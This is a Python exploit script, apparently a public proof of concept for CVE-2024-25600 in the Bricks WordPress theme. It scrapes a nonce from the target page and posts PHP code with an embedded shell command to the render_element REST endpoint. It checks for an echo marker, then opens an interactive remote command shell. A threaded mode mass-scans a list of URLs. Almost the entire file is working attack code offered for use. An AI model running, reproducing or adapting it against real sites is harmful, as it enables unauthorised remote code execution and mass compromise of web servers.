#!/bin/python3

import re
import requests
import argparse
import threading
from bs4 import BeautifulSoup
from rich.console import Console
from prompt_toolkit import PromptSession, HTML
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from concurrent.futures import ThreadPoolExecutor
from alive_progress import alive_bar

color = Console()

def ascii_art():
    color.print("""[bright_magenta]
   ██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗ ███████╗ ██████╗
  ██╔════╝ ██╔════╝██╔══██╗██╔════╝██╔════╝██╔═══██╗██╔════╝██╔═══██╗
  ██║  ███╗█████╗  ██████╔╝█████╗  ███████╗██║   ██║█████╗  ██║   ██║
  ██║   ██║██╔══╝  ██╔══██╗██╔══╝  ╚════██║██║   ██║██╔══╝  ██║   ██║
  ╚██████╔╝███████╗██║  ██║███████╗███████║╚██████╔╝███████╗╚██████╔╝
   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝ 
                        Tools By Dedsec — CVE-2024-25600 RCE PoC
    [/bright_magenta]""", style="bold")
    color.print("[bold green]Created by: Dedsec Security Team[/bold green]\n")

headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0"
}

paths = [
    "/wp-json/bricks/v1/render_element",
    "/?rest_route=/bricks/v1/render_element"
]

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def fetch_nonce(target):
    try:
        response = requests.get(target, verify=False, timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")
        script_tag = soup.find("script", id="bricks-scripts-js-extra")
        if script_tag:
            match = re.search(r'"nonce":"([a-f0-9]+)"', script_tag.string)
            if match:
                return match.group(1)
    except Exception:
        return None

def create_vulnerable_data(nonce, command):
    return {
        "postId": "1",
        "nonce": nonce,
        "element": {
            "name": "code",
            "settings": {
                "executeCode": "true",
                "code": f"<?php throw new Exception(`{command}`);?>"
            }
        }
    }

def create_element(nonce):
    return {
        "postId": "1",
        "nonce": nonce,
        "element": {
            "name": "container",
            "settings": {
                "hasLoop": "true",
                "query": {
                    "useQueryEditor": True,
                    "queryEditor": "throw new Exception(`echo KHABuhwxnUHDDW`);",
                    "objectType": "post"
                }
            }
        }
    }

def exploit_successful(target, path, element):
    try:
        response = requests.post(target + path, headers=headers, json=element, verify=False, timeout=10)
        if response.status_code == 200 and 'KHABuhwxnUHDDW' in response.text:
            color.print(f"[bold green][+][/bold green] Target [cyan]{target}[/cyan] is [bold green]VULNERABLE[/bold green]")
            return True
    except:
        pass
    color.print(f"[bold red][-][/bold red] Target [cyan]{target}[/cyan] not vulnerable")
    return False

def interactive_shell(target, nonce):
    session = PromptSession(history=InMemoryHistory())
    color.print("[bold green][*][/bold green] Interactive shell ready (type 'exit' to quit)")
    while True:
        try:
            command = session.prompt(HTML("<ansired><b>DedsecShell> </b></ansired>"), auto_suggest=AutoSuggestFromHistory())
            if command.lower() in ['exit', 'quit']:
                break
            data = create_vulnerable_data(nonce, command)
            for path in paths:
                response = requests.post(target + path, headers=headers, json=data, verify=False, timeout=10)
                output = response.json().get('data', {}).get('html', '')
                print(output.replace("Exception: ", "").strip())
        except KeyboardInterrupt:
            break
        except Exception as e:
            color.print(f"[bold red][!][/bold red] Error: {e}")

def exploit(target):
    color.print(f"[bold yellow][*][/bold yellow] Fetching nonce from {target}")
    nonce = fetch_nonce(target)
    if nonce:
        element = create_element(nonce)
        for path in paths:
            if exploit_successful(target, path, element):
                interactive_shell(target, nonce)
                return
    else:
        color.print(f"[bold red][x][/bold red] Failed to retrieve nonce from {target}")

def scan_file(file_path, threads):
    with open(file_path, "r") as f:
        urls = [url.strip() for url in f if url.strip()]

    def thread_task(url):
        nonce = fetch_nonce(url)
        if nonce:
            for path in paths:
                if exploit_successful(url, path, create_element(nonce)):
                    break
        bar()

    with alive_bar(len(urls), title="Scanning", bar="smooth", enrich_print=False) as bar:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for url in urls:
                executor.submit(thread_task, url)

def main():
    ascii_art()
    parser = argparse.ArgumentParser(description='Dedsec CVE-2024-25600 Exploit Tool')
    parser.add_argument('-u', '--url', help='Single target URL')
    parser.add_argument('-f', '--file', help='File with list of URLs')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads for scanning')
    args = parser.parse_args()

    if args.url:
        exploit(args.url)
    elif args.file:
        scan_file(args.file, args.threads)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
                
